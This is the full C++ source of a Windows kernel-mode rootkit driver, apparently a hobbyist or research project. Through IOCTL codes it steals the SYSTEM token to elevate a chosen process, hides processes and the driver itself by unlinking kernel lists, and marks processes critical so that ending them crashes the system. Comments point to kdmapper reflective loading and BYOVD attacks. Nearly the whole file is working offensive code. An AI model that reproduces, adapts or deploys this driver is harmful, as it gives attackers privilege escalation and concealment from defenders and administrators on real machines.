#include "externs.h"
#include <wdm.h>
#pragma warning(push)
#pragma warning(disable: 4100)  // Unreferenced formal parameter
#pragma warning(disable : 4099)
// #define DRL // Uncomment if you want to reflectively load the driver.
#ifndef DRL
#define DL
#endif
// debug printing
void debug_print(PCSTR text) {
    KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, text));
}
/*
Functions 
*/

ULONG TOKEN_OFFSET = 0;
ULONG ACTIVE_PROCESS_LINKS_OFFSET = 0;
ULONG IMAGE_FILE_NAME_OFFSET = 0;

ULONG GetImageFileNameOffset() {
    RTL_OSVERSIONINFOW osVersion = { 0 };
    osVersion.dwOSVersionInfoSize = sizeof(osVersion);

    // Query the OS version
    if (NT_SUCCESS(RtlGetVersion(&osVersion))) {
        // Switch based on the build number and set the offsets accordingly
        switch (osVersion.dwBuildNumber) {
        case 26100: // Windows 11 24H2 
            TOKEN_OFFSET = 0x248;
            ACTIVE_PROCESS_LINKS_OFFSET = 0x1d8;
            IMAGE_FILE_NAME_OFFSET = 0x338;
            break;
            // Only in windows 11 24H2 the offsets changed, it's because i hate microsoft.
            // Default case is when we didnt specify a case for the build number that the PC is using, so we just use the traditional ones.
        case 7601: // Windows 7 latest build
            TOKEN_OFFSET = 0x208;
            ACTIVE_PROCESS_LINKS_OFFSET = 0x188;
            IMAGE_FILE_NAME_OFFSET = 0x2e0;
            break;
        case 3790: // Windows XP Latest builds (SP2) (Includes Windows Server 2003)
            TOKEN_OFFSET = 0x160;
            ACTIVE_PROCESS_LINKS_OFFSET = 0xe0;
            IMAGE_FILE_NAME_OFFSET = 0x268;
            break;
        default: // Just use them default ones.
            TOKEN_OFFSET = 0x4b8;
            ACTIVE_PROCESS_LINKS_OFFSET = 0x448;
            IMAGE_FILE_NAME_OFFSET = 0x5a8;
            break;
        }
        return osVersion.dwBuildNumber;
    }
    else {
        return 0;
    }
}

VOID FlinkBlinkHide(PLIST_ENTRY Current) {
    PLIST_ENTRY Prev, Next;

    // Get the previous and next list entries from the current entry
    Prev = (Current->Blink);
    Next = (Current->Flink);

    // Unlink the current entry from the list:
    // 1. Set the previous entry's Flink (forward link) to the point of the next entry
    Prev->Flink = Next;
    // 2. Set the next entry's Blink (Backwards Link) to point to the previous entry
    Next->Blink = Prev;
    // We now have hidden the current entry.

    // To avoid a crash (BSOD) due to dangling pointers, rewrite the current entry's pointers so that they refer to itself.
    // This makes it an isolated circular list.
    Current->Blink = (PLIST_ENTRY)&Current->Flink;
    Current->Flink = (PLIST_ENTRY)&Current->Flink;
    return;
}

NTSTATUS ProtectProcess(UINT32 PID) {
    if (GetImageFileNameOffset() == 0) {
        debug_print("[!-!] Build number unknown, returning from ProtectProcess.\n");
        return STATUS_UNSUCCESSFUL;
    }
    NTSTATUS status = STATUS_SUCCESS;

    CLIENT_ID clientId;
    HANDLE hProcess;
    OBJECT_ATTRIBUTES objAttr;
    ULONG BreakOnTermination = 1;

    clientId.UniqueThread = NULL;
    clientId.UniqueProcess = UlongToHandle(PID);
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &clientId);
    if (status == STATUS_UNSUCCESSFUL) {
        // Failure here means we will not open to modify the information of the process.
        debug_print("[-] Failed to open process to use on ProtectProcess, returning.\n");
        return status;
    }
    status = ZwSetInformationProcess(hProcess, ProcessBreakOnTermination, &BreakOnTermination, sizeof(ULONG));
    if (status == STATUS_UNSUCCESSFUL) {
        // Failure here means the process will not be marked as BreakOnTermination, which means it isn't protected.
        debug_print("[-] Failed to set process information to use on ProtectProcess, returning.\n");
        return status;
    }
    debug_print("[+] Process is now part of the SYSTEM, termination will result to blue screen, restart to revert.\n");
    return status;
}

VOID HideProcess(UINT32 PID) {
    if (GetImageFileNameOffset() == 0) {
        debug_print("[!-!] Aborting HideProcess, unknown build.");
        return;
    }
    debug_print("[+] HideProcess function called.\n");
    // Assume ACTIVE_PROCESS_LINKS_OFFSET is the offset to the process ID within the EPROCESS struct.
    // Here, PID_OFFSET is set to that offset.
    ULONG PID_OFFSET = ACTIVE_PROCESS_LINKS_OFFSET;
    ULONG LIST_OFFSET = PID_OFFSET;
    // The code uses an INT_PTR variable to adjust LIST_OFFSET
    // Essentially, LIST_OFFSET is advanced by the size of the pointer itself (likely 8 bytes)
    INT_PTR ptr;
    LIST_OFFSET += sizeof(ptr);

    // Get the current process (starting point to start traversing)
    PEPROCESS CurrentEPROCESS = PsGetCurrentProcess();

    // Calculate the pointer to the current process's ActiveProcessList list entry.
    PLIST_ENTRY CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);

    // Calculate the address of the current pointer PID field. (basically, gets his PID from within the current EPROCESS structure, using the known offset.)
    PUINT32 CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);

    // First check if this current process, is the one we want to hide (by checking its pid using CurrentPID)
    if (*(UINT32*)CurrentPID == PID) {
        // If the current process PID is the one we want to hide, the hide it by unlinking it from its list entry.
        FlinkBlinkHide(CurrentList);
        debug_print("[+] Process is now hidden.\n");
        return;
    }
    // Otherwise, we set a starting point to start looping.
    PEPROCESS StartProcess = CurrentEPROCESS;


    // Move to the next process in the list.
    // The next process's EPROCESS is computed by taking the pointer from CurrentList->Flink
    // then subtracting LIST_OFFSET to get back to the base of the EPROCESS structure.
    CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList->Flink - LIST_OFFSET);
    CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
    CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);


    // Traverse the process list until we circle back to the starting process (looping)
    while ((ULONG_PTR)StartProcess != (ULONG_PTR)CurrentEPROCESS) {
        // If the current process PID in the loop matches the one we want to hide, we unlink it from the list.
        if (*(UINT32*)CurrentPID == PID) {
            FlinkBlinkHide(CurrentList);
            debug_print("[+] Process is now hidden.\n");
            return;
        }

        // Move to the next process: adjust the pointer based on the list entry.
        CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList->Flink - LIST_OFFSET);
        CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
        CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
    }
    // Return the result.
    debug_print("[*] Returning from function HideProcess.\n");
    return;
}

NTSTATUS ElevateProcess(UINT32 PID) {
    if (GetImageFileNameOffset() == 0) {
        debug_print("[!-!] Aborting ElevateProcess, unknown build.");
        return STATUS_UNSUCCESSFUL;
    }
    DbgPrint("[+] Starting to elevate process %u.\n", PID);
    NTSTATUS status = STATUS_SUCCESS;
    PEPROCESS pTargetProcess, pSystemProcess;
    ULONG srcPid = 4; // PID 4 Is the "SYSTEM" Process, it is the most privileged process, handles hardware and software interaction, runs in kernel mode, we use it to dominate the world!

    // Lookup the eprocess addr from the dstPid (PID) (The one the user wants to elevate)
    status = PsLookupProcessByProcessId(ULongToHandle(PID), &pTargetProcess);
    if (status != STATUS_SUCCESS) {
        debug_print("[-] Target PID PsLookup failed.\n");
        return status;
    }

    DbgPrint("[+] Target EProcess address: 0x%p\n", pTargetProcess);

    // Lookup the eprocess addr from the srcpid (system process)
    status = PsLookupProcessByProcessId(ULongToHandle(srcPid), &pSystemProcess);

    if (status != STATUS_SUCCESS) {
        // What the hell?
        debug_print("[!] Failed to lookup the source process PsLookup, this is a major error, since it's the SYSTEM process.\n");
        return status;
    }

    DbgPrint("[+] Source EProcess address: 0x%p\n", pSystemProcess);
    debug_print("[+] Setting source (SYSTEM) token to the target token\n");

    // Perform token stealing, overwrite the target process token with the SYSTEM process token.
    // This is done by copying the token pointer from the SYSTEM process's EPROCESS structure
    // to the target process's EPROCESS structure, using the current latest known offset, which is defined as 0x4b8
    __try {
        *(UINT64*)((UINT64)pTargetProcess + (UINT64)TOKEN_OFFSET) = *(UINT64*)(UINT64(pSystemProcess) + (UINT64)TOKEN_OFFSET); // Now the token pointer for the target pid is now the SYSTEM's one, essentially copying it.
        debug_print("--------------------------------------------------------\n");
        debug_print("[+] Successfully elevated process using SYSTEM token.\n");
        debug_print("--------------------------------------------------------\n");
        return STATUS_SUCCESS;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        debug_print("[!] Exception occured during token stealing.\n");
        status = GetExceptionCode();
    }

    // Cleanup
    ObDereferenceObject(pSystemProcess);
    ObDereferenceObject(pTargetProcess);

    return status;
}

KSPIN_LOCK g_Lock;
KIRQL g_OldIrql;

void HideDriverHandler(PDRIVER_OBJECT DriverObject) {
    KIRQL oldIrql;

    // Raise IRQL to prevent race conditions
    KeAcquireSpinLock(&g_Lock, &oldIrql);

    __try {
        if (!DriverObject) {
            debug_print("[!] Invalid DriverObject!\n");
            __leave;
        }

        PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
        if (!entry || !MmIsAddressValid(entry)) {
            debug_print("[!] Invalid driver section.\n");
            __leave;
        }

        // Unlink from PsLoadedModuleList
        PLIST_ENTRY prevEntry = entry->InLoadOrderLinks.Blink;
        PLIST_ENTRY nextEntry = entry->InLoadOrderLinks.Flink;

        KeMemoryBarrier();

        // Essentially, skip over us when iterating over the loaded drivers.
        prevEntry->Flink = nextEntry;
        nextEntry->Blink = prevEntry;

        KeMemoryBarrier();

        debug_print("[+] Driver is now hidden.\n");
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        debug_print("[!] Exception while hiding driver.\n");
    }

    // Release the spinlock
    KeReleaseSpinLock(&g_Lock, oldIrql);
    debug_print("[+] Driver is now hidden, spinlock released.\n");
}


/*
End Of Functions.
*/

namespace Rootkit {
    namespace codes {
        // CTL Codes to communicate with User Mode application.
        constexpr ULONG HideDriver =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x696, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG ElevateProcess =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x697, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG HideProcess =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x698, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG ProtectProcess =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x699, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
    }
    struct Request {
        HANDLE process_id;
    };

    NTSTATUS create(PDEVICE_OBJECT device_object, PIRP Irp) {
        UNREFERENCED_PARAMETER(device_object);

        IoCompleteRequest(Irp, IO_NO_INCREMENT);

        return Irp->IoStatus.Status;
    }

    NTSTATUS close(PDEVICE_OBJECT device_object, PIRP Irp) {
        UNREFERENCED_PARAMETER(device_object);

        IoCompleteRequest(Irp, IO_NO_INCREMENT);

        return Irp->IoStatus.Status;
    }


    NTSTATUS device_control(PDEVICE_OBJECT device_object, PIRP Irp) {
        UNREFERENCED_PARAMETER(device_object);

        debug_print("[+] Device control called.\n");

        /* By default, it is unsuccessful. */
        NTSTATUS status = STATUS_UNSUCCESSFUL;

        // This will determine which code was sent from the user mode app.
        PIO_STACK_LOCATION stack_irp = IoGetCurrentIrpStackLocation(Irp);

        // Access the request object sent from user mode.
        auto request = reinterpret_cast<Request*>(Irp->AssociatedIrp.SystemBuffer);

        if (stack_irp == nullptr || request == nullptr) {
            // to avoid an explosion (bsod) we will just complete request, if we didnt check for this our computer will crash with the kernel error code bsod.
            IoCompleteRequest(Irp, IO_NO_INCREMENT);
            return STATUS_UNSUCCESSFUL;
        }

        // Declare DriverObject before the switch statement
        PDRIVER_OBJECT DriverObject = nullptr;

        // The target process we want to access, init here.
        static PEPROCESS target_process = nullptr;

        // finally handle the control code sent
        const ULONG control_code = stack_irp->Parameters.DeviceIoControl.IoControlCode;
        HANDLE pid = request->process_id;
        switch (control_code) {
        case codes::HideDriver:
            DriverObject = IoGetCurrentIrpStackLocation(Irp)->DeviceObject->DriverObject;
            if (!DriverObject) {
                debug_print("[!] Failed to get DriverObject.");
                break;
            }
            HideDriverHandler(DriverObject);
            debug_print("[+] Driver hiding request processed");
            break;
        case codes::ElevateProcess:
            //status = PsLookupProcessByProcessId(request->process_id, &target_process);
            ElevateProcess(HandleToUlong(pid));
            // Use target_process in the ElevateProcess function.
            break;
        case codes::HideProcess:
            HideProcess(HandleToUlong(pid));
            break;
        case codes::ProtectProcess:
            ProtectProcess(HandleToUlong(pid));
            break;
        default:
            // something is horribly wrong
            debug_print("[!] Unknown control code received!");
            break;
        }
        Irp->IoStatus.Status = status;
        Irp->IoStatus.Information = sizeof(Request);
        IoCompleteRequest(Irp, IO_NO_INCREMENT);

        return status;
    }
}

// The actual entry point, since we are loading with kdmapper, in real life, when you use lets say a BYOVD attack, you would use the normal DriverEntry() with arguments (look in msdn website)
NTSTATUS DriverMain(PDRIVER_OBJECT driver_object, PUNICODE_STRING registry_path) {
    UNREFERENCED_PARAMETER(registry_path);

    UNICODE_STRING device_name = {};
    RtlInitUnicodeString(&device_name, L"\\Device\\rootkit");

    PDEVICE_OBJECT device_object = nullptr;
    NTSTATUS status = IoCreateDevice(driver_object, 0, &device_name, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN,
        FALSE, &device_object);

    if (status != STATUS_SUCCESS) {
        debug_print("[!] Failed to create device driver.\n");
        return status;
    }

    debug_print("[+] Device driver creation successful.\n");

    // Create symlink

    UNICODE_STRING symbolic_link = {};
    RtlInitUnicodeString(&symbolic_link, L"\\DosDevices\\rootkit");

    status = IoCreateSymbolicLink(&symbolic_link, &device_name);

    if (status != STATUS_SUCCESS) {
        debug_print("[!] Failed to create symbolic link.\n");
        return status;
    }

    debug_print("[+] Driver symbolic link creation successful.\n");

#ifdef DL // If the driver is loaded via a service and not reflectively, register callbacks.
    // THIS IS PLANNED.
#endif

    // Setup IOCTL Comm.
    // Allow us to send small amounts of data between user-mode/kernel-mode
    SetFlag(device_object->Flags, DO_BUFFERED_IO);

    // Set the driver handlers to our function with our logic.
    driver_object->MajorFunction[IRP_MJ_CREATE] = Rootkit::create;
    driver_object->MajorFunction[IRP_MJ_CLOSE] = Rootkit::close;
    driver_object->MajorFunction[IRP_MJ_DEVICE_CONTROL] = Rootkit::device_control;

    ClearFlag(device_object->Flags, DO_DEVICE_INITIALIZING);

    debug_print("[+] Device initialized successfully.\n");

    return status;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    debug_print("[+] DriverEntry called\n");

    UNICODE_STRING driver_name = {};
    RtlInitUnicodeString(&driver_name, L"\\Driver\\rootkit");
    /*
	Remember to uncomment #define DRL in the top if you want to load reflectively (via KDMapper for example)
    */
#ifdef DRL
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);
    debug_print("Driver is reflectively loaded\n");
    return IoCreateDriver(&driver_name, &DriverMain);
#else
    return DriverMain(DriverObject, RegistryPath);
#endif
}
